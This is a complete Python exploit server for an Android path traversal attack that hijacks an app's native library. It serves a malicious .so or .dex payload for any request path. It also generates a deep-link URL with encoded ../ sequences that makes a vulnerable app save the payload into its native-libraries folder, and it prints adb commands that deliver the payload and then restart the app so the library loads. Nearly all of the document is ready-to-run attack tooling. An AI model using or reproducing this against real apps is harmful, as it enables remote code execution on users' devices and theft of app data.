#!/usr/bin/env python3
"""
Path Traversal Exploit Server for Android Native Library Hijack

Serves a payload file (typically a malicious .so) for ANY request path.
Standard http.server decodes %2F and resolves ../ causing 404 — this server
ignores the request path entirely and always serves the payload.

Usage:
  python3 path_traversal_server.py --payload libplugin.so --port 8888
  python3 path_traversal_server.py --payload evil.dex --port 8080

Then trigger via deep link:
  adb shell am start -a android.intent.action.VIEW \
    -d "http://<HOST>:8888/x/..%2F..%2F..%2F..%2Fdata%2Fdata%2F<PKG>%2Ffiles%2Fnative-libraries%2Farm64-v8a%2Flibplugin.so" \
    <PKG>

Reference: android-path-traversal-rce.md
"""

import argparse
import http.server
import os
import sys


class PayloadHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler that serves the payload file for ANY request path."""

    payload_data = b""
    payload_name = ""

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(self.payload_data)))
        self.send_header("Content-Disposition",
                         f'attachment; filename="{self.payload_name}"')
        self.end_headers()
        self.wfile.write(self.payload_data)

    def do_HEAD(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(self.payload_data)))
        self.end_headers()

    def log_message(self, fmt, *args):
        path = args[0] if args else "?"
        print(f"[HIT] {self.client_address[0]} → {path}")


def generate_traversal_url(host: str, port: int, package: str, abi: str,
                           lib_name: str, depth: int = 4) -> str:
    """Generate the full deep link URL with path traversal."""
    traversal = "%2F..".join([".."] + [""] * (depth - 1))
    # Build: ..%2F..%2F..%2F..%2Fdata%2Fdata%2F<pkg>%2Ffiles%2F...
    traversal_prefix = "..%2F" * depth
    target_path = f"data%2Fdata%2F{package.replace('.', '.')}%2Ffiles%2Fnative-libraries%2F{abi}%2F{lib_name}"
    return f"http://{host}:{port}/x/{traversal_prefix}{target_path}"


def main():
    parser = argparse.ArgumentParser(
        description="Exploit server for Android path traversal → native lib hijack")
    parser.add_argument('--payload', required=True, help='Path to payload file (.so, .dex)')
    parser.add_argument('--port', type=int, default=8888, help='Listen port (default: 8888)')
    parser.add_argument('--host', default='0.0.0.0', help='Listen address (default: 0.0.0.0)')
    parser.add_argument('--package', help='Target package name (for URL generation)')
    parser.add_argument('--abi', default='arm64-v8a', help='Target ABI (default: arm64-v8a)')
    parser.add_argument('--lib-name', default='libplugin.so', help='Target library name')
    parser.add_argument('--depth', type=int, default=4,
                        help='Traversal depth from download dir to root (default: 4)')

    args = parser.parse_args()

    if not os.path.exists(args.payload):
        print(f"[-] Payload file not found: {args.payload}")
        sys.exit(1)

    with open(args.payload, "rb") as f:
        PayloadHandler.payload_data = f.read()
    PayloadHandler.payload_name = os.path.basename(args.payload)

    print(f"[*] Serving payload: {args.payload} ({len(PayloadHandler.payload_data)} bytes)")
    print(f"[*] Listening on {args.host}:{args.port}")

    if args.package:
        url = generate_traversal_url("HOST_IP", args.port, args.package,
                                     args.abi, args.lib_name, args.depth)
        print(f"\n[*] Deep link URL (replace HOST_IP):")
        print(f"    {url}")
        print(f"\n[*] adb command:")
        print(f'    adb shell am start -a android.intent.action.VIEW \\')
        print(f'      -d "{url}" \\')
        print(f'      {args.package}')

    print(f"\n[*] After payload delivery, restart app to trigger load:")
    print(f"    adb shell am start -S -W -n {args.package or '<PKG>'}/.MainActivity")
    print()

    server = http.server.HTTPServer((args.host, args.port), PayloadHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped")
        server.shutdown()


if __name__ == '__main__':
    main()
